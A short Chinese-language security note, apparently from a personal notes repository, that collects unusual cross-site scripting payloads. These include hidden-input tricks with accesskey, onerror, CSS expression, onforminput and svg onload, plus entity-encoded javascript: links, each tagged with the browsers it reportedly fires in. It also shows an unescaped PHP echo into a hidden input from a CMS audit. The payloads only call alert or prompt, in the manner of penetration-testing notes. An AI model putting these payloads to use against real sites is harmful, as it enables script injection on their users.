## XSS_另类的Payload
### 一、prompt
```html
%3Cp%3E1111111\">< img src=1 onerror=prompt('xss')>%3Cbr%2F%3E%3C%2Fp%3E
```
### 二、accesskey
将类型转换为image，将难以利用的xss漏洞无需用户交互就可以触发</br>
```html
<input type="hidden" accesskey="X" onclick="alert(0)">
```
在firefox中可以复现</br>


另： 今天在审一个cms的时候</br>
<input type="hidden" name="group_id" value="<?php echo $group_id?>" /></br>
这中就很容易构造.....</br>


<input value="" type=image src onerror=alert(1) type="hidden"></br>
chrome、ms edge可复现</br>

### 三、
```html
<input type=hidden style=x:expression(alert(1))>
```
测试于IE6-9 成功

### 四、
```html
<form><input type=hidden onforminput=alert('what?')><input></form>
```
测试于Opera12

### 五、
```html
<svg><input type=hidden onload=alert(1)>
```
测试于safari7.0.6

### 六、对标签属性值进行转码 || 插入控制字符
```html
<a href=javascr&#9ipt:alert(1)>www</a>
```
<img src=https://github.com/n4ttt/Sec-Note/blob/main/Image/clipboard.png>
